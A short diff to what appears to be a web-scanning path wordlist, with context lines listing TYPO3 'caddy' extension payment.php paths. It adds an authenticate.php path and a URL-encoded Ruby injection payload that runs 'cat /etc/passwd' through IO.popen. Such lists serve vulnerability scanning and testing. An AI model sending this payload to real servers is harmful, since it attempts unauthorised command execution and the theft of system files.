@@ -892,3 +892,5 @@
 /typo3conf/ext/caddy/Resources/Public/JavaScript/e-payment/paymill/api/payment.php
 /caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
 /typo3plugins/plugins/caddy/Resources/Public/JavaScript/e-payment/paymill/api/php/payment.php
+/actions/authenticate.php
+?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
